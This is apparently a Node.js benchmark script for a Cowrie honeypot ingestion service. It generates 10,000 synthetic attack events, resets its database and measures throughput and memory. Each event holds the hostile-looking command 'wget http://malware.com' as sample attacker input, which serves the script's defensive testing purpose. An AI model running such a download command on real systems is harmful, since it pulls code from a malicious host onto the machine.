const fs = require('fs');
const path = require('path');
const { getDb, migrate } = require('./db/migrate');
const IngestionService = require('./services/ingestion');
const { THREAT_ACTORS } = require('./services/eventGenerator');

// We will manually generate a huge payload
const benchmarkFile = path.join(__dirname, 'test_data', 'benchmark_cowrie.json');

function generateBenchmarkData(targetEventCount) {
    console.log(`Generating ${targetEventCount} events for benchmark...`);
    if (fs.existsSync(benchmarkFile)) fs.unlinkSync(benchmarkFile);
    const fd = fs.openSync(benchmarkFile, 'w');
    
    let generated = 0;
    while (generated < targetEventCount) {
        const evt = {
            eventid: 'cowrie.command.input',
            session: 'bench-session-' + Math.floor(generated / 10),
            timestamp: new Date().toISOString(),
            src_ip: THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)].ip,
            input: 'wget http://malware.com'
        };
        fs.writeSync(fd, JSON.stringify(evt) + '\n');
        generated++;
    }
    fs.closeSync(fd);
    console.log('Generation complete.');
}

async function runBenchmark() {
    const TARGET = 10000; // Let's test with 10k events
    generateBenchmarkData(TARGET);

    // Reset DB for benchmark
    const dbPath = path.join(__dirname, 'hyshield.db');
    if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath);
    if (fs.existsSync(dbPath + '-wal')) fs.unlinkSync(dbPath + '-wal');
    if (fs.existsSync(dbPath + '-shm')) fs.unlinkSync(dbPath + '-shm');
    
    await migrate();
    const db = await getDb();

    console.log('Starting ingestion...');
    const ingestor = new IngestionService(benchmarkFile);
    await ingestor.init();

    const startTime = Date.now();
    const startMemory = process.memoryUsage().heapUsed;

    // Wait until processed
    while (ingestor.offset < fs.statSync(benchmarkFile).size || ingestor.isProcessing) {
        await new Promise(r => setTimeout(r, 100));
    }

    const endTime = Date.now();
    const endMemory = process.memoryUsage().heapUsed;

    const durationMs = endTime - startTime;
    const eps = Math.round((TARGET / durationMs) * 1000);
    const memMb = Math.round((endMemory - startMemory) / 1024 / 1024);

    console.log('--- Benchmark Results ---');
    console.log(`Events Processed: ${ingestor.metrics.eventsIngested}`);
    console.log(`Duration: ${durationMs} ms`);
    console.log(`Throughput: ${eps} events/second`);
    console.log(`Memory Used: ~${memMb} MB`);
    console.log(`Database Errors: ${ingestor.metrics.errors}`);

    ingestor.closeFile();
}

runBenchmark().catch(console.error);
